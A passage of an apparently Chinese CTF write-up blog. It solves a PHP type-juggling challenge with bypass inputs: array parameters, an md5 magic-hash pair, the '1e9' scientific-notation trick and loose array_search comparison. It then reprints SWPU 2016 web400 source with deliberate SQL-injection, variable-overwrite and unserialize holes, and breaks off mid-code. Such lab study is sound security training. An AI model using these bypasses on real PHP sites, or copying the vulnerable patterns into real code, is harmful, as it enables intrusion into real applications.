Basic]了解过PHP特性吗</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;rce.php&quot;</span>);</span><br><span class="line"><span class="variable">$checker_1</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_2</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_3</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_4</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_114</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;114&#x27;</span>];</span><br><span class="line"><span class="variable">$_514</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;514&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr4y</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arr4y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$checker_1</span> &amp;&amp; <span class="variable">$checker_2</span> &amp;&amp; <span class="variable">$checker_3</span> &amp;&amp; <span class="variable">$checker_4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rce</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>首先看num：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不能匹配到数字，intval后又要等于1.</p><p>可以用非空数组绕过，?num[]&#x3D;1这里的1不会被正则匹配到。</p><p>然后看这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5绕过，找一个纯字母的和一个纯数字的反一下就好。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctype=YcGyb&amp;is_num=807016042</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>?114&#x3D;1e9&amp;514&#x3D;99999999999a即可。</p><p>最后：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>数组中不能匹配到NSS且数组的值被intval过了，不可能为NSS。此处有一个array_search，是弱比较，0&#x3D;&#x3D;0绕过即可，NSS与数字比较时为0.因此array[]&#x3D;0即可。索引也是0，符合。</p><h2 id="SWPU-2016-web400"><a href="#SWPU-2016-web400" class="headerlink" title="[SWPU 2016]web400"></a>[SWPU 2016]web400</h2><p>源码没有给，只能去wp里面找了。</p><p>common.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="title function_ invoke__">Array</span>(<span class="string">&quot;_POST&quot;</span>,<span class="string">&quot;_GET&quot;</span>,<span class="string">&quot;_COOKIE&quot;</span>) <span class="keyword">as</span> <span class="variable">$key</span>)&#123;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$$key</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$v</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;hello,hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$k</span>[<span class="number">0</span>] !=<span class="string">&#x27;_&#x27;</span>?<span class="variable">$$k</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$v</span>):<span class="variable">$$k</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>riji.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] !== <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">                <span class="variable">$sql1</span> = <span class="string">&quot;select * from msg where userid= <span class="subst">$id</span> order by id&quot;</span>;</span><br><span class="line">                <span class="variable">$query</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>);</span><br><span class="line">                <span class="variable">$result1</span> = <span class="keyword">array</span>();</span><br><span class="line">                <span class="keyword">while</span>(<span class="variable">$temp</span>=<span class="title function_ invoke__">mysql_fetch_assoc</span>(<span class="variable">$query</span>)) &#123;</span><br><span class="line">                    <span class="variable">$result1</span>[]=<span class="variable">$temp</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">                <span class="keyword">foreach</span>(<span class="variable">$result1</span> <span class="keyword">as</span> <span class="variable">$x</span>=&gt;<span class="variable">$o</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="title function_ invoke__">display</span>(<span class="variable">$o</span>[<span class="string">&#x27;msg&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;common.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (@<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] === <span class="number">1</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location:/web/riji.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$check</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$userid</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$msgid</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$this</span>-&gt;name);</span><br><span class="line">        @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">        <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;check === <span class="title function_ invoke__">md5</span>(<span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>] . <span class="variable">$this</span>-&gt;data . <span class="variable">$username</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;(=-=)!!&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">do_method</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">check</span>() === <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_msg&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_msg</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">elseif</span>(<span class="variable language_">$this</span>-&gt;method === <span class="string">&#x27;del_user&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">del_user</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_msg</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;msgid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$msg_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;msgid);</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql1</span> = <span class="string">&quot;DELETE FROM msg where id=&#x27;<span class="subst">$msg_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql1</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete message wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your msg_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">del_user</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;userid)&#123;</span><br><span class="line">            <span class="variable">$user_id</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$this</span>-&gt;userid);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$user_id</span> == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Admin can\&#x27;t delete!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">            <span class="variable">$sql2</span> = <span class="string">&quot;DELETE FROM user where userid=&#x27;<span class="subst">$user_id</span>&#x27;&quot;</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user success!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Delete user wrong!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">&#x27;&lt;script&gt;alert(&quot;Check Your user_id!!&quot;)&lt;/script&gt;&#x27;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$api</span>));</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">do_method</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(@<span class="variable">$login</span>==<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    @<span class="title function_ invoke__">mysql_conn</span>();</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from user where name=&#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = @<span class="title function_ invoke__">mysql_fetch_array</span>(<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>));</span><br><span class="line">    <span class="title function_ invoke__">mysql_close</span>();</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$result</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result</span>[<span class="string">&#x27;passwd&#x27;</span>] == <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$user_cookie</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">            <span class="variable">$user_cookie</span> .= <span class="variable">$result</span>[<span class="string">&#x27;salt&#x27;</span>];</span><br><span class="line">            <span class="variable">$cookies</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">            <span class="comment">//$cookies = $user_cookie;</span></span><br><span class="line">        